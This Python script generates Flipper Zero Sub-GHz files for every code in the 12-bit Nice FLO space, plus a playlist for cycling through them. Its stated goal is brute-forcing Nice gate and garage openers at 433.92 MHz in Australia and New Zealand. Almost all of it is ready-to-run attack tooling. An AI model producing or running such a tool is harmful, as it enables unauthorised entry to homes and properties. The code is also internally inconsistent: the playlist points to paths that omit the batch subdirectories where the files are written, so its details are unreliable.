#!/usr/bin/env python3
"""
Nice FLO 12-bit Brute Force Generator for Australian 433.92 MHz Gates
Flipper Zero Sub-GHz Playlist Compatible

Generates individual .sub files for each Nice FLO 12-bit code (0x000-0xFFF)
and a playlist file to cycle through them on the Flipper.

Nice FLO protocol: 12-bit fixed code, TE ~700us, OOK modulation
Common on Nice brand gate and garage door openers in AU/NZ
Total code space: 4096 codes (2^12)

Usage:
    python nice_flo_bruteforce_gen.py --output-dir ../../car_hacks_au/gates/nice_flo_bf/
    python nice_flo_bruteforce_gen.py --output-dir ../../car_hacks_au/gates/nice_flo_bf/ --range 0x000 0x1FF
    python nice_flo_bruteforce_gen.py --playlist-only --output-dir ../../car_hacks_au/gates/nice_flo_bf/
"""

import argparse
import os
from pathlib import Path


NICE_FLO_BIT = 12
NICE_FLO_TE = 700
NICE_FLO_FREQ = 433920000
NICE_FLO_PRESET = "FuriHalSubGhzPresetOok650Async"


def int_to_nice_flo_key(code: int) -> str:
    """Convert a 12-bit Nice FLO code to 8-byte hex key format."""
    if code < 0 or code > 0xFFF:
        raise ValueError(f"Nice FLO code must be 0x000-0xFFF, got 0x{code:03X}")
    # 12-bit code right-aligned in 8 bytes
    return f"00 00 00 00 00 00 {(code >> 4) & 0xFF:02X} {(code & 0xF) << 4 | ((code >> 8) & 0xF):02X}"


def generate_nice_flo_sub(code: int, output_path: Path):
    """Generate a single Nice FLO .sub Key File."""
    key_hex = int_to_nice_flo_key(code)
    content = f"""Filetype: Flipper SubGhz Key File
Version: 1
Frequency: {NICE_FLO_FREQ}
Preset: {NICE_FLO_PRESET}
Protocol: Nice FLO
Bit: {NICE_FLO_BIT}
Key: {key_hex}
TE: {NICE_FLO_TE}
"""
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(content, encoding="utf-8")


def generate_playlist(output_dir: Path, start: int, end: int):
    """Generate a playlist .txt pointing to all generated .sub files."""
    playlist_path = output_dir / "nice_flo_bruteforce_playlist.txt"
    lines = [
        "# Nice FLO 12-bit Brute Force Playlist",
        f"# Code range: 0x{start:03X} - 0x{end:03X}",
        f"# Total files: {end - start + 1}",
        f"# Frequency: {NICE_FLO_FREQ} (433.92 MHz AU)",
        f"# Protocol: Nice FLO, Bit: {NICE_FLO_BIT}, TE: {NICE_FLO_TE}",
        "#",
    ]
    for code in range(start, end + 1):
        sd_path = f"/ext/subghz/car_hacks_au/gates/nice_flo_bf/nice_flo_{code:03X}.sub"
        lines.append(sd_path)

    playlist_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"[+] Playlist -> {playlist_path}")


def main():
    parser = argparse.ArgumentParser(
        description="Nice FLO 12-bit Brute Force Generator for AU 433.92 MHz"
    )
    parser.add_argument(
        "--output-dir", type=str, default="nice_flo_bf",
        help="Output directory for generated .sub files"
    )
    parser.add_argument(
        "--range", nargs=2, type=lambda x: int(x, 0), default=[0x000, 0xFFF],
        metavar=("START", "END"),
        help="Code range in hex (default: 0x000 0xFFF for full 4096)"
    )
    parser.add_argument(
        "--playlist-only", action="store_true",
        help="Only generate playlist, skip .sub file generation"
    )
    parser.add_argument(
        "--batch-size", type=int, default=256,
        help="Files per subdirectory (default: 256)"
    )

    args = parser.parse_args()
    output_dir = Path(args.output_dir)
    start, end = args.range

    if not args.playlist_only:
        total = end - start + 1
        print(f"[*] Generating {total} Nice FLO .sub files (0x{start:03X} - 0x{end:03X})...")
        print(f"[*] Output: {output_dir.resolve()}")

        for code in range(start, end + 1):
            # Batch into subdirectories of batch_size
            batch = code // args.batch_size
            batch_dir = output_dir / f"batch_{batch:02X}"
            filename = f"nice_flo_{code:03X}.sub"
            generate_nice_flo_sub(code, batch_dir / filename)

            if (code - start + 1) % 500 == 0:
                print(f"  ... {code - start + 1}/{total} files generated")

        print(f"[+] Generated {total} .sub files")

    generate_playlist(output_dir, start, end)


if __name__ == "__main__":
    main()
